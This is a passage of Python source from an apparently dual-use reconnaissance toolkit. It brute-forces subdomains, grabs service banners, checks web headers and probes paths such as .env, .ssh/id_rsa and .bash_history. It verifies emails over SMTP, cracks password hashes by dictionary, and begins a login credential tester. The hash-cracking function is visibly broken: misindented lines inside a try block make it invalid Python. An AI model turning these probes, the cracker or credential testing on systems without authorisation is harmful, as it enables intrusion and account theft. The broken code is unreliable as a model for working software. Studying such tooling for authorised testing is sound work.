                    with lock: # Acquire lock before modifying shared resources
                        found_subdomains.append((full_domain, ip_address))
                        self.log(f"[+] Found subdomain: {full_domain} [{ip_address}]", "green")
                except (socket.gaierror, socket.timeout):
                    pass # Subdomain does not exist or timed out
                except Exception as e:
                    self.log(f"[!] Error checking {full_domain}: {str(e)}", "yellow")
                finally:
                    with lock: # Acquire lock before modifying shared resources
                        checked_count += 1
                        if update_progress:
                            update_progress(checked_count, total_subs, f"Checking: {full_domain}")

        threads = []
        max_workers = 100 # Can be adjusted
        for _ in range(max_workers):
            if not self.scan_active: break
            t = threading.Thread(target=subdomain_worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
        
        # Check for wildcard DNS if any subdomains were found or attempted
        self.log("\n[+] Checking for Wildcard DNS...", "yellow")
        try:
            # Generate a truly random subdomain to test for wildcard DNS
            random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
            random_sub = f"{random_string}.{domain}"
            random_sub_ip = socket.gethostbyname(random_sub)
            self.log(f"[!] Wildcard DNS detected: '{random_sub}' resolves to '{random_sub_ip}'. This means many non-existent subdomains might resolve.", "red")
        except socket.gaierror:
            self.log("[+] No wildcard DNS detected (random subdomain did not resolve).", "green")
        except Exception as e:
            self.log(f"[!] Error checking wildcard DNS: {str(e)}", "yellow")


        # Summarize results
        if found_subdomains:
            self.log("\n[+] Found Subdomains:", "green")
            for sub, ip in sorted(found_subdomains):
                self.log(f"  - {sub} [{ip}]", "green")
        else:
            self.log("[-] No subdomains found through bruteforcing.", "yellow")
        
        if update_progress: update_progress(100, 100, "Subdomain enumeration complete.")
        return [s[0] for s in found_subdomains]

    def ip_geolocation(self, ip, update_progress=None):
        """Get geolocation information for an IP address using multiple services as fallbacks."""
        if not self.scan_active: return

        self.log(f"\n[+] Geolocation for {ip}", "cyan")
        self.log("=" * 50, "cyan")

        # Resolve domain to IP if a domain is provided
        if not self.is_ip_address(ip):
            try:
                resolved_ip = socket.gethostbyname(ip)
                self.log(f"[+] Resolved {ip} to {resolved_ip} for geolocation.", "green")
                ip = resolved_ip
            except socket.gaierror:
                self.log(f"[-] Could not resolve host {ip} to an IP address.", "red")
                return False # Indicate failure
            except Exception as e:
                self.log(f"[-] Unexpected error resolving host {ip}: {str(e)}", "red")
                return False # Indicate failure

        api_services = [
            ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
            ("ip-api.com", f"http://ip-api.com/json/{ip}"), # Note: ip-api.com has rate limits for free tier
            ("ipapi.co", f"https://ipapi.co/{ip}/json/")
        ]
        
        total_services = len(api_services)

        for i, (service_name, api_url) in enumerate(api_services):
            if not self.scan_active: return False # Check scan_active within loop
            self.log(f"[•] Trying {service_name}...", "info")
            if update_progress: update_progress(int((i / total_services) * 100), 100, f"Querying {service_name}...")
            try:
                response = self.session.get(api_url, timeout=self.timeout)
                response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
                data = response.json()

                # Robustly check if data contains expected geolocation information
                if service_name == "ipinfo.io" and data.get('ip') == ip and data.get('loc'):
                    self.log(f"[+] Data from {service_name}:", "green")
                    self.log(f"  IP: {data.get('ip', 'N/A')}")
                    self.log(f"  Hostname: {data.get('hostname', 'N/A')}")
                    self.log(f"  City: {data.get('city', 'N/A')}")
                    self.log(f"  Region: {data.get('region', 'N/A')}")
                    self.log(f"  Country: {data.get('country', 'N/A')}") # ipinfo provides ISO code
                    # Additional info: data.get('country_name', 'N/A') would require separate lookup
                    self.log(f"  Location (Lat/Lon): {data.get('loc', 'N/A')}")
                    self.log(f"  Organization: {data.get('org', 'N/A')}")
                    self.log(f"  Timezone: {data.get('timezone', 'N/A')}")
                    
                    lat, lon = data['loc'].split(',')
                    self.log(f"\n[+] Map Link: https://www.google.com/maps/place/{lat},{lon}", "info")
                    if update_progress: update_progress(100, 100, "Geolocation complete.")
                    return True
                elif service_name == "ip-api.com" and data.get('status') == 'success' and data.get('query') == ip:
                    self.log(f"[+] Data from {service_name}:", "green")
                    self.log(f"  IP: {data.get('query', 'N/A')}")
                    self.log(f"  ISP: {data.get('isp', 'N/A')}")
                    self.log(f"  Organization: {data.get('org', 'N/A')}")
                    self.log(f"  Country: {data.get('country', 'N/A')} ({data.get('countryCode', 'N/A')})")
                    self.log(f"  City: {data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}")
                    self.log(f"  Latitude: {data.get('lat', 'N/A')}, Longitude: {data.get('lon', 'N/A')}")
                    self.log(f"  Timezone: {data.get('timezone', 'N/A')}")
                    
                    if 'lat' in data and 'lon' in data:
                        self.log(f"\n[+] Map Link: https://www.google.com/maps/place/{data['lat']},{data['lon']}", "info")
                    if update_progress: update_progress(100, 100, "Geolocation complete.")
                    return True
                elif service_name == "ipapi.co" and data.get('ip') == ip and 'error' not in data:
                    self.log(f"[+] Data from {service_name}:", "green")
                    self.log(f"  IP: {data.get('ip', 'N/A')}")
                    self.log(f"  City: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}")
                    self.log(f"  Country: {data.get('country_name', 'N/A')} ({data.get('country_code', 'N/A')})")
                    self.log(f"  Latitude: {data.get('latitude', 'N/A')}, Longitude: {data.get('longitude', 'N/A')}")
                    self.log(f"  ISP/Organization: {data.get('org', 'N/A')}")
                    
                    if 'latitude' in data and 'longitude' in data:
                        self.log(f"\n[+] Map Link: https://www.google.com/maps/place/{data['latitude']},{data['longitude']}", "info")
                    if update_progress: update_progress(100, 100, "Geolocation complete.")
                    return True
                else:
                    self.log(f"[-] {service_name} returned unexpected or incomplete data.", "yellow")

            except requests.exceptions.RequestException as e:
                self.log(f"[-] Error querying {service_name}: {e}. Check API limits or network.", "yellow")
            except json.JSONDecodeError:
                self.log(f"[-] {service_name} returned invalid JSON.", "yellow")
            except Exception as e:
                self.log(f"[!] Unexpected error with {service_name}: {str(e)}", "red")
        
        self.log("[-] Could not retrieve geolocation information from any service.", "red")
        if update_progress: update_progress(100, 100, "Geolocation failed.")
        return False

    def vulnerability_scan(self, target, ports_str=None, timeout=10, update_progress=None):
        """
        Performs a comprehensive vulnerability scan including:
        - Service version detection (banner grabbing)
        - Common vulnerability checks (based on banners)
        - Security header analysis (for web services)
        - SSL/TLS configuration checks (for HTTPS services)
        - Basic common file/directory enumeration (for web services)
        """
        if not self.scan_active: 
            return
            
        self.log(f"\n[+] Starting Vulnerability Scan on {target}", "cyan")
        self.log("=" * 50, "cyan")

        ports_to_check = []
        if not ports_str:
            self.log("[•] No specific ports provided. Using common ports for scanning.", "info")
            ports_to_check = [21, 22, 23, 80, 443, 3306, 3389, 8080, 8443, 8000, 8081, 9000]  # Common web and service ports
        else:
            try:
                for part in ports_str.split(','):
                    part = part.strip()
                    if '-' in part:
                        start, end = map(int, part.split('-'))
                        if not (0 < start < 65536 and 0 < end < 65536 and start <= end):
                            self.log(f"[-] Invalid port range: {part}. Skipping.", "yellow")
                            continue
                        ports_to_check.extend(range(start, end + 1))
                    else:
                        port = int(part)
                        if not (0 < port < 65536):
                            self.log(f"[-] Invalid port: {port}. Skipping.", "yellow")
                            continue
                        ports_to_check.append(port)
                ports_to_check = sorted(list(set(ports_to_check)))
            except ValueError:
                self.log(f"[!] Invalid port specification: {ports_str}. Using default common ports.", "red")
                ports_to_check = [21, 22, 23, 80, 443, 3306, 3389, 8080, 8443, 8000, 8081, 9000]
        
        if not ports_to_check:
            self.log("[-] No valid ports to scan for vulnerabilities.", "red")
            return
            
        total_steps = len(ports_to_check) * 2 # For banner grabbing + basic checks
        current_step = 0
        vulnerabilities_found = []

        self.log(f"[•] Identifying services on {len(ports_to_check)} ports...", "info")

        for port in ports_to_check:
            if not self.scan_active: return vulnerabilities_found
            current_step += 1
            if update_progress: update_progress(current_step, total_steps, f"Checking service on port {port}")

            try:
                # 1. Banner Grabbing
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    s.connect((target, port))
                    banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    service_name = socket.getservbyport(port, 'tcp') if port < 49151 else 'unknown'
                    
                    self.log(f"[+] Port {port} ({service_name}) - Banner: {banner[:100]}...", "info")

                    # Basic vulnerability checks based on service/banner
                    if "FTP" in banner.upper():
                        if "vsFTPd 2.3.4" in banner:
                            vulnerabilities_found.append(f"Port {port}: vsFTPd 2.3.4 Backdoor (CVE-2011-2523) - HIGH")
                            self.log(f"[!!!] Vulnerable: vsFTPd 2.3.4 Backdoor found on port {port}", "red")
                        if "220 (vsFTPd" in banner and "Anonymous" in banner:
                             self.log(f"[!] Warning: Anonymous FTP login may be enabled on port {port}", "yellow")
                             vulnerabilities_found.append(f"Port {port}: Potential Anonymous FTP access - MEDIUM")
                    
                    if "SSH" in banner.upper():
                        if re.search(r"OpenSSH_\d+\.\d+", banner) and not re.search(r"OpenSSH_(?:7\.[7-9]|\d{2,}|[8-9]\.)", banner): 
                            self.log(f"[!] Vulnerable: Potentially outdated OpenSSH version on port {port}. Consider updating.", "yellow")
                            vulnerabilities_found.append(f"Port {port}: Outdated OpenSSH version detected - MEDIUM")
                    
                    if port in [80, 443, 8080, 8443]: # Web service ports
                        req_url = f"http://{target}:{port}" if port == 80 or port == 8080 else f"https://{target}:{port}"
                        self.log(f"[•] Checking web server on {req_url}", "info")
                        try:
                            res = self.secure_handler.make_request("get", req_url, allow_redirects=True)
                            
                            # Check for default pages
                            if any(phrase in res.text.lower() for phrase in ["apache default page", "nginx welcome", "iis7", "it works!"]):
                                self.log(f"[!] Default web server page found on {req_url}. May disclose server info.", "yellow")
                                vulnerabilities_found.append(f"Port {port}: Default web page exposed - LOW")

                            # Check for debug tokens/info leaks in body
                            if 'X-Debug-Token' in res.headers or 'phpinfo()' in res.text:
                                self.log(f"[!!!] Critical: Debug information or phpinfo() exposed on {req_url}", "red")
                                vulnerabilities_found.append(f"Port {port}: Debug/Sensitive Info Exposed - HIGH")

                            # Analyze security headers for web ports
                            self._analyze_security_headers(res.headers, update_progress)
                            self._check_cookie_security(res.headers)
                            self._check_allowed_http_methods(req_url)
                            self._check_common_files(req_url)
                            self._check_directory_listing(res)
                            
                            if port == 443 or port == 8443: # Only for HTTPS
                                self.ssl_info(target, port=port) # Call SSL info check

                        except requests.exceptions.RequestException as e:
                            self.log(f"[-] Error accessing web server on {req_url}: {e}", "yellow")
                        except Exception as e:
                            self.log(f"[!] Unexpected error during web checks on {req_url}: {str(e)}", "red")
                    
                    # Add more checks as needed for other services (e.g., MySQL, RDP, etc.)
                    if port == 3306 and "MySQL" in banner:
                        self.log(f"[•] Detected MySQL service on port {port}. Manual check for default credentials is recommended.", "info")
                        # No automated check for default credentials without a wordlist/user input.
                        
            except socket.timeout:
                self.log(f"[-] Port {port}: Connection timed out (likely closed/filtered)", "yellow")
            except ConnectionRefusedError:
                self.log(f"[-] Port {port}: Connection refused (likely closed)", "yellow")
            except Exception as e:
                self.log(f"[!] Error during banner grabbing or basic check on port {port}: {str(e)}", "red")
            finally:
                current_step += 1 # Increment for the check part
                if update_progress: update_progress(current_step, total_steps, f"Analyzed port {port}")

        if vulnerabilities_found:
            self.log("\n[!!!] Vulnerability Scan Summary - Issues Found [!!!]", "red")
            for vuln in vulnerabilities_found:
                self.log(f"  - {vuln}", "red")
        else:
            self.log("\n[+] No obvious vulnerabilities detected on common ports.", "green")
        
        if update_progress: update_progress(100, 100, "Vulnerability scan complete.")
        return vulnerabilities_found
        
    def http_headers(self, url, update_progress=None):
        """Check HTTP headers of a website with comprehensive security analysis."""
        if not self.scan_active: 
            return

        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url  # Default to HTTPS for web scans
        self.log(f"\n[+] HTTP Headers Analysis for {url}", "cyan")
        self.log("=" * 50, "cyan")

        try:
            self.log("[•] Sending HTTP request...", "info")
            if update_progress: update_progress(10, 100, "Fetching HTTP headers...")
            
            response = self.secure_handler.make_request("get", url, allow_redirects=True)
            response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
            
            self.log(f"Status Code: {response.status_code}")
            self.log(f"Final URL: {response.url}")
            self.log(f"Content Length: {len(response.content)} bytes")
            self.log("\n[+] All Headers Received:", "green")
            for header, value in response.headers.items():
                self.log(f"  {header}: {value}")

            self._analyze_security_headers(response.headers, update_progress)
            self._check_server_information_disclosure(response.headers)
            self._check_cookie_security(response.headers)
            self._check_allowed_http_methods(url)
            self._check_common_files(url)
            self._check_directory_listing(response)

            if update_progress: update_progress(100, 100, "HTTP header analysis complete.")

        except requests.exceptions.Timeout:
            self.log(f"[-] Request timed out after {self.timeout} seconds for {url}", "red")
        except requests.exceptions.ConnectionError:
            self.log(f"[-] Could not connect to {url}. Check URL or network.", "red")
        except requests.exceptions.HTTPError as e:
            self.log(f"[-] HTTP Error for {url}: {e.response.status_code} - {e.response.reason}", "red")
        except requests.RequestException as e:
            self.log(f"[-] Error retrieving HTTP headers: {e}", "red")
        except Exception as e:
            self.log(f"[-] An unexpected error occurred during HTTP header check: {str(e)}", "red")

    def _analyze_security_headers(self, headers, update_progress=None):
        """Analyzes common security-related HTTP headers."""
        self.log("\n[+] Security Headers Analysis:", "yellow")
        security_headers_checks = {
            'Strict-Transport-Security': {'recommendation': 'Enforce HTTPS for all future requests (min 1 year max-age).', 'critical': True, 'check': lambda v: 'max-age=0' not in v.lower() and (re.search(r'max-age=(\d+)', v.lower()) and int(re.search(r'max-age=(\d+)', v.lower()).group(1)) >= 31536000)},
            'Content-Security-Policy': {'recommendation': 'Restrict content sources to mitigate XSS and data injection attacks (avoid "unsafe-inline", "unsafe-eval", "*").', 'critical': True, 'check': lambda v: "'unsafe-inline'" not in v.lower() and "'unsafe-eval'" not in v.lower() and '*' not in v},
            'X-Frame-Options': {'recommendation': 'Prevent clickjacking (DENY or SAMEORIGIN).', 'critical': True, 'check': lambda v: v.lower() in ['deny', 'sameorigin']},
            'X-Content-Type-Options': {'recommendation': 'Prevent MIME sniffing (nosniff).', 'critical': True, 'check': lambda v: 'nosniff' in v.lower()},
            'X-XSS-Protection': {'recommendation': 'Enable browser XSS filter (1; mode=block).', 'critical': False, 'check': lambda v: '1; mode=block' in v.lower()},
            'Referrer-Policy': {'recommendation': 'Control referrer information leakage (e.g., no-referrer, same-origin, strict-origin-when-cross-origin).', 'critical': False, 'check': lambda v: v.lower() in ['no-referrer', 'same-origin', 'strict-origin-when-cross-origin', 'no-referrer-when-downgrade']},
            'Permissions-Policy': {'recommendation': 'Control browser features (e.g., camera, microphone). Implement as needed.', 'critical': False, 'check': lambda v: bool(v)}, # Just presence for now
            'Cross-Origin-Opener-Policy': {'recommendation': 'Isolate documents from untrusted popups (same-origin, same-origin-allow-popups).', 'critical': True, 'check': lambda v: v.lower() in ['same-origin', 'same-origin-allow-popups']}
        }

        issues_found = False
        step = 0
        total_steps = len(security_headers_checks)

        for header, info in security_headers_checks.items():
            if not self.scan_active: return
            value = headers.get(header)
            status_emoji = "✅"
            message_color = "green"
            recommend_text = ""

            if value:
                is_secure = False
                try:
                    is_secure = info['check'](value)
                except Exception: # Catch any parsing errors in lambda
                    is_secure = False # Assume insecure if check fails
                    
                if not is_secure:
                    status_emoji = "⚠️"
                    message_color = "yellow"
                    recommend_text = f"   [!] Insecure configuration. Recommendation: {info['recommendation']}"
                    issues_found = True
                self.log(f"{status_emoji} {header}: {value}")
            else:
                status_emoji = "❌"
                message_color = "red"
                recommend_text = f"   [!] Missing header. Recommendation: {info['recommendation']}"
                issues_found = True
                self.log(f"{status_emoji} {header}: Not Set")
            
            if recommend_text:
                self.log(recommend_text, message_color)
            
            step += 1
            # Update progress within security header analysis
            # Ensure update_progress is called with total progress for the entire HTTP header scan,
            # not just this sub-function. This is handled by the main http_headers function calling
            # update_progress before and after this sub-analysis.
            # update_progress(step, total_steps, f"Analyzing {header}...") 

        if not issues_found:
            self.log("\n[+] No major security header issues detected.", "green")
        else:
            self.log("\n[!] Review the security header issues above for hardening opportunities.", "yellow")


    def _check_server_information_disclosure(self, headers):
        """Checks for server information disclosure via headers."""
        self.log("\n[+] Server Information Disclosure Check:", "yellow")
        server_disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'Via', 'X-Generator', 'X-Wp-Version']
        found_info = False
        for header in server_disclosure_headers:
            if header in headers:
                self.log(f"[!] Potential Info Disclosure - {header}: {headers[header]}", "red")
                found_info = True
        if not found_info:
            self.log("[+] No direct server information disclosure headers found.", "green")
        else:
            self.log("[!] Consider obfuscating or removing these headers to reduce attack surface.", "yellow")

    def _check_cookie_security(self, headers):
        """Checks for security attributes on Set-Cookie headers."""
        self.log("\n[+] Cookie Security Analysis:", "yellow")
        if 'Set-Cookie' in headers:
            cookies = headers.get_list('Set-Cookie')
            if not cookies:
                self.log("[+] No cookies set in headers.", "green")
                return

            for i, cookie_str in enumerate(cookies):
                self.log(f"Cookie {i+1}: {cookie_str}", "info")
                issues = []
                
                is_secure = 'secure' in cookie_str.lower()
                if not is_secure and "https://" in self.session.url: # Only warn if HTTPS is used
                    issues.append("[!] Missing 'Secure' flag (cookie sent over HTTP, exposes to sniffing)")
                
                is_httponly = 'httponly' in cookie_str.lower()
                if not is_httponly:
                    issues.append("[!] Missing 'HttpOnly' flag (accessible via JavaScript, vulnerable to XSS)")
                
                samesite_match = re.search(r'samesite=([^;,\s]+)', cookie_str.lower())
                samesite_value = samesite_match.group(1) if samesite_match else 'None'
                if samesite_value not in ['lax', 'strict']:
                    issues.append(f"[!] Inadequate SameSite policy: {samesite_value} (should be Lax or Strict to prevent CSRF)")
                
                if issues:
                    for issue in issues:
                        self.log(f"  {issue}", "red")
                else:
                    self.log("  [+] Cookie appears to have secure attributes (Secure, HttpOnly, SameSite).", "green")
        else:
            self.log("[+] No 'Set-Cookie' header found.", "green")

    def _check_allowed_http_methods(self, url):
        """Checks allowed HTTP methods using OPTIONS request."""
        self.log("\n[+] Allowed HTTP Methods Check:", "yellow")
        try:
            options_response = self.secure_handler.make_request("options", url)
            options_response.raise_for_status()
            if 'Allow' in options_response.headers:
                allowed_methods = options_response.headers['Allow'].upper().split(', ')
                allowed_methods = [m.strip() for m in allowed_methods] # Clean up whitespace
                self.log(f"Allowed Methods: {', '.join(allowed_methods)}", "green")
                dangerous_methods = {'PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH'} # Added PATCH
                found_dangerous = False
                for method in allowed_methods:
                    if method in dangerous_methods:
                        self.log(f"  [!] Potentially dangerous method allowed: {method} (consider disabling if not needed)", "red")
                        found_dangerous = True
                if not found_dangerous:
                    self.log("  [+] No dangerous HTTP methods detected.", "green")
            else:
                self.log("[-] 'Allow' header not found in OPTIONS response. Cannot determine allowed methods.", "yellow")
        except requests.exceptions.RequestException as e:
            self.log(f"[-] Could not perform OPTIONS request: {str(e)}", "red")

    def _check_common_files(self, url):
        """Checks for the existence of common sensitive files."""
        self.log("\n[+] Common Sensitive Files Check:", "yellow")
        common_files = [
            'robots.txt', 'sitemap.xml', '.git/config', '.env', 'admin/', 
            'phpinfo.php', 'test.php', 'backup.zip', 'wp-config.php', 'crossdomain.xml',
            'config.php', 'configuration.php', 'login.bak', 'admin.bak', 'test.bak',
            '.bash_history', '.ssh/id_rsa', 'wp-admin/install.php', 'phpmyadmin/',
            'web.config.bak', 'error_log', 'access_log'
        ]
        found_any = False
        for file_path in common_files:
            if not self.scan_active: return
            full_url = f"{url.rstrip('/')}/{file_path}"
            try:
                # Use head request to avoid downloading large files
                head_response = self.secure_handler.make_request("head", full_url, allow_redirects=True)
                if head_response.status_code == 200:
                    self.log(f"[!] Found sensitive file/directory: {full_url} (Status: {head_response.status_code})", "red")
                    found_any = True
                elif head_response.status_code != 404: # Log anything other than 200 or 404
                    self.log(f"[?] Unexpected status for {full_url}: {head_response.status_code}", "yellow")
            except requests.exceptions.RequestException:
                pass # Expected for files not found or network issues
            except Exception as e:
                self.log(f"[!] Error checking common file {full_url}: {str(e)}", "red")
        if not found_any:
            self.log("[+] No common sensitive files or directories found.", "green")
        else:
            self.log("[!] Investigate found files/directories for potential data exposure or misconfigurations.", "red")

    def _check_directory_listing(self, response):
        """Checks if directory listing is enabled."""
        self.log("\n[+] Directory Listing Check:", "yellow")
        # Check title and body content for common directory listing patterns
        if response.status_code == 200 and (
            '<title>Index of /</title>' in response.text or 
            'Directory Listing For' in response.text or
            '<pre>' in response.text and ('parent directory' in response.text or 'Name' in response.text and 'Last modified' in response.text)
        ):
            self.log("[!!!] Directory listing is ENABLED on the server. This may disclose sensitive information.", "red")
        else:
            self.log("[+] Directory listing does not appear to be enabled.", "green")


    def email_verify(self, email, update_progress=None):
        """
        Verify if an email address exists and gather OSINT information.
        Note: SMTP verification is often blocked/rate-limited by mail servers.
        Data breach checks usually require external APIs (not implemented here for privacy/API key reasons).
        """
        if not self.scan_active: return

        self.log(f"\n[+] Email Verification for {email}", "cyan")
        self.log("=" * 50, "cyan")

        if '@' not in email:
            self.log("[-] Invalid email address format.", "red")
            return

        domain = email.split('@')[-1]
        
        # 1. MX Records Check
        self.log("\n[+] MX Records Check:", "yellow")
        mx_servers = []
        try:
            # Use a robust resolver setup
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9'] # Public DNS for MX lookup
            resolver.timeout = self.timeout
            resolver.lifetime = self.timeout
            
            mx_records = resolver.resolve(domain, 'MX', raise_on_no_answer=False)
            if mx_records.rrset:
                mx_servers = [str(mx.exchange).rstrip('.') for mx in mx_records.rrset]
                self.log(f"[+] MX Records found for {domain}:", "green")
                for mx in mx_servers:
                    self.log(f"  - {mx}")
            else:
                self.log(f"[-] No MX records found for {domain}. Email address likely invalid or domain misconfigured.", "red")
                return # No point proceeding without MX records
        except dns.resolver.NoNameservers:
            self.log(f"[-] No nameservers configured or reachable for MX lookup for {domain}.", "red")
            return
        except dns.resolver.Timeout:
            self.log(f"[-] Timeout querying MX records for {domain}.", "red")
            return
        except dns.resolver.NXDOMAIN:
            self.log(f"[-] Domain {domain} does not exist (NXDOMAIN) for MX lookup.", "red")
            return
        except Exception as e:
            self.log(f"[-] Error querying MX records: {str(e)}", "red")
            return
        
        if update_progress: update_progress(20, 100, "Checking MX records...")

        # 2. SMTP Verification (Best effort - often blocked)
        self.log("\n[+] SMTP Verification (Best Effort):", "yellow")
        email_exists_smtp = False
        for mx in mx_servers:
            if not self.scan_active: return
            server = None # Initialize server for finally block
            try:
                # Attempt to connect to SMTP server on port 25
                server = smtplib.SMTP(mx, 25, timeout=self.timeout) 
                server.set_debuglevel(0) # Disable debug output for cleaner logs
                server.helo(socket.getfqdn()) # Say hello to the SMTP server
                server.mail('noreply@localhost.invalid') # Sender email (can be anything)
                code, message = server.rcpt(email) # Recipient email check
                
                if code == 250:
                    self.log(f"[+] Email appears to exist via SMTP on {mx}", "green")
                    email_exists_smtp = True
                    break
                elif code == 550:
                    self.log(f"[-] Email does not exist via SMTP on {mx} (550: Mailbox not found)", "yellow")
                else:
                    self.log(f"[!] SMTP response from {mx}: {code} {message.decode().strip()}", "yellow")
                
            except (smtplib.SMTPConnectError, smtplib.SMTPException, socket.timeout, ConnectionRefusedError) as e:
                self.log(f"[-] SMTP connection/error with {mx}: {e}", "yellow")
            except Exception as e:
                self.log(f"[-] Unexpected SMTP error with {mx}: {str(e)}", "red")
            finally:
                if server:
                    try:
                        server.quit()
                    except smtplib.SMTPServerDisconnected:
                        pass # Server already disconnected
                    except Exception as e:
                        self.log(f"[-] Error quitting SMTP session with {mx}: {str(e)}", "red")
        
        if not email_exists_smtp:
            self.log("[-] Could not confirm email existence via SMTP for any MX server. (Often blocked by servers)", "yellow")
        
        if update_progress: update_progress(50, 100, "Attempting SMTP verification...")

        # 3. Social Media Presence (Username check)
        self.log("\n[+] Checking Social Media Presence (username based):", "yellow")
        username = email.split('@')[0]
        social_networks = {
            'Facebook': f'https://www.facebook.com/public/{username}', # Public profile search
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://www.instagram.com/{username}',
            'LinkedIn': f'https://www.linkedin.com/in/{username}',
            'GitHub': f'https://github.com/{username}',
            'Reddit': f'https://www.reddit.com/user/{username}',
            'Pinterest': f'https://pinterest.com/{username}',
            'Medium': f'https://medium.com/@{username}',
            'YouTube': f'https://www.youtube.com/@{username}',
            'TikTok': f'https://www.tiktok.com/@{username}'
        }
        
        found_social = False
        checked_count = 0
        total_social = len(social_networks)

        for platform_name, url_template in social_networks.items():
            if not self.scan_active: return
            checked_count += 1
            if update_progress: update_progress(50 + int(40 * (checked_count / total_social)), 100, f"Checking social media: {platform_name}")
            try:
                # Use head request first, then GET if needed to avoid downloading full pages
                response = self.secure_handler.make_request("head", url_template, allow_redirects=True)
                
                # Check for 200 OK or specific redirects indicating a profile
                # Heuristics for profile detection can be tricky and platform-dependent
                if response.status_code == 200:
                    # For some platforms, a 200 may mean "page exists, but not necessarily a user profile"
                    # A follow-up GET might be needed, but it's heavier.
                    self.log(f"[+] Found potential {platform_name} profile: {url_template} (Status: {response.status_code})", "green")
                    found_social = True
                elif response.status_code in [301, 302, 303, 307, 308]:
                     # For redirects, try to follow and check final URL. This is already handled by allow_redirects=True in head.
                     # If the HEAD redirect isn't enough, a GET might be useful, but for performance, stick to HEAD first.
                     self.log(f"[?] Redirect from {platform_name}: {response.status_code} to {response.headers.get('Location', 'N/A')}", "info")
            except requests.exceptions.RequestException:
                pass # Expected for profiles not found
            except Exception as e:
                self.log(f"[!] Error checking {platform_name}: {str(e)}", "yellow")

        if not found_social:
            self.log("[-] No direct social media profiles found for this username.", "yellow")
        
        if update_progress: update_progress(100, 100, "Email verification complete.")

    def crack_password_hash(self, hash_value, hash_type='md5', wordlist=None, update_progress=None):
        """
        Crack password hashes using dictionary attack.
        
        Args:
            hash_value (str): The hash to crack
            hash_type (str): Type of hash (md5, sha1, sha256, sha512, ntlm, etc.)
            wordlist (str): Path to wordlist file
            update_progress (function): Callback for progress updates
        """
        if not self.scan_active:
            return
            
        self.log(f"\n[+] Password Hash Cracker", "cyan")
        self.log("=" * 50, "cyan")
        
        try:
            import hashlib
            # import itertools # Not used currently
            # import binascii # Not directly used, hashlib handles encoding
            
            # Common passwords to try first (preset for quick checks)
        # Minimal common passwords for testing (educational/authorized testing only)
        common_passwords = [
            "admin", "password", "123456", "default"  # Reduced to essential test cases
        ]
        
        # Add security warnings
        self.log("[!] SECURITY WARNING: Using minimal default password list", "yellow", "warning")
        self.log("[!] ETHICAL USE ONLY: Only test systems you own or have explicit permission to test", "yellow", "warning")
        self.log("[!] For comprehensive testing, provide your own wordlist file", "info", "audit")
            
            # Add wordlist if provided
            wordlist_words = []
            if wordlist:
                try:
                    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                        wordlist_words = [line.strip() for line in f if line.strip()]
                    self.log(f"[•] Loaded {len(wordlist_words)} words from wordlist: {wordlist}", "info")
                except FileNotFoundError:
                    self.log(f"[-] Wordlist file not found: {wordlist}", "red")
                except Exception as e:
                    self.log(f"[-] Error reading wordlist: {str(e)}", "red")
            
            # Combine common passwords and wordlist, removing duplicates
            passwords_to_try = list(dict.fromkeys(common_passwords + wordlist_words))
            
            if not passwords_to_try:
                self.log("[-] No passwords to try. Please provide a wordlist or use default common passwords.", "red")
                return None
            
            self.log(f"[•] Starting dictionary attack with {len(passwords_to_try)} passwords...", "info")
            
            # Hash functions
            def md5_hash(pwd):
                return hashlib.md5(pwd.encode()).hexdigest()
                
            def sha1_hash(pwd):
                return hashlib.sha1(pwd.encode()).hexdigest()
                
            def sha256_hash(pwd):
                return hashlib.sha256(pwd.encode()).hexdigest()
                
            def sha512_hash(pwd):
                return hashlib.sha512(pwd.encode()).hexdigest()
                
            def ntlm_hash(pwd):
                # NTLM hash requires a specific encoding (UTF-16LE) and MD4
                # Python's hashlib.md4 is available but not exposed directly.
                # Re-implementing it for clarity or using a dedicated library like 'hashlib'
                # For this script, sticking to standard hashlib.
                # A common way to get MD4 for NTLM:
                try:
                    # This requires 'pycryptodome' or similar for MD4, not standard hashlib
                    # For simplicity, will just return placeholder or error if not available.
                    # Or, as in the original code, use hashlib.new which can create it if available
                    import hashlib
                    return hashlib.new('md4', pwd.encode('utf-16le')).hexdigest()
                except Exception:
                    self.log("[-] NTLM hashing requires specific MD4 implementation, which may not be available by default.", "red")
                    return None
            
            hash_funcs = {
                'md5': md5_hash,
                'sha1': sha1_hash,
                'sha256': sha256_hash,
                'sha512': sha512_hash,
                'ntlm': ntlm_hash
            }
            
            if hash_type.lower() not in hash_funcs:
                self.log(f"[-] Unsupported hash type: {hash_type}", "red")
                self.log("[•] Supported hash types: " + ", ".join(hash_funcs.keys()), "info")
                return None
            
            hash_func = hash_funcs[hash_type.lower()]
            
            # Try each password
            for i, password in enumerate(passwords_to_try):
                if not self.scan_active:
                    self.log("\n[!] Password cracking interrupted.", "yellow")
                    return None
                    
                # Update progress every N attempts or a percentage
                if update_progress and (i % 1000 == 0 or i == len(passwords_to_try) - 1):
                    progress = int((i + 1) / len(passwords_to_try) * 100)
                    update_progress(progress, 100, f"Trying password {i+1}/{len(passwords_to_try)}...")
                
                try:
                    hashed = hash_func(password)
                    if hashed is None: # NTLM might return None if not supported
                        continue
                    
                    if hashed.lower() == hash_value.lower():
                        self.log(f"\n[+] Password found: {password}", "green")
                        return password
                        
                except Exception as e:
                    self.log(f"[-] Error hashing password '{password[:10]}...': {str(e)}", "red")
                    continue
            
            self.log("\n[-] Password not found in the wordlist", "yellow")
            return None
            
        except Exception as e:
            self.log(f"[-] Error during password cracking process: {str(e)}", "red")
            return None
    
    def test_credentials(self, url, username_field, password_field, usernames, passwords, 
                        success_indicator=None, method='post', csrf_field=None, 
                        update_progress=None):
        """
        Test credentials against a login form or API endpoint.
        
        Args:
            url (str): Login URL
